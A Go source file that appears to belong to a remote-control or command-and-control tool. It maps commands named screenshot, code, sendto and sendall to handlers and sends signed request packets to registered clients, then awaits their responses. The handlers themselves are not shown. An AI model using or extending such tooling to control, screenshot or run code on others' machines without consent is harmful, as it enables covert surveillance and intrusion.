package snippets

import (
	"fmt"
	"net/http"
	"time"

	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/cmd/pc3/lib"
	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/proto"
)

var Snippets map[string]func(ctx lib.CommandContext, arg string) (string, error)

func init() {
	Snippets = map[string]func(ctx lib.CommandContext, arg string) (string, error){
		"info":       snippetInfo,
		"screenshot": snippetScreenshot,
		"sendall":    snippetSendall,
		"sendto":     snippetSendto,
		"code":       snippetCode,
	}
}

func sendRRToClientAwaitResponse(ctx lib.CommandContext, clientId string, payload []byte, timeout time.Duration) (*proto.PacketRR, error) {
	client, err := ctx.State.ClientGet(clientId)
	if err != nil {
		return nil, fmt.Errorf("could not get client `%s` from the database: %s", clientId, err.Error())
	}

	// Write request to the DB and get a TxId.
	req, err := ctx.State.Request(client.Address, proto.PacketRR{
		Payload: payload,
	})
	if err != nil {
		return nil, fmt.Errorf("could not save request to the db: %s", err.Error())
	}

	data, err := proto.Marshal(&req, ctx.OwnPrivKey)
	if err != nil {
		return nil, fmt.Errorf("could not marshal packet data: %s", err.Error())
	}

	err = (*ctx.Radio).Send(ctx.Context, proto.Packet{
		Peer:   client.Address,
		Method: http.MethodPost,
		Route:  proto.ROUTE_RR,
		Data:   data,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to send packet: %s", err.Error())
	}

	return ctx.State.AwaitResponse(req.TxId, timeout)
}
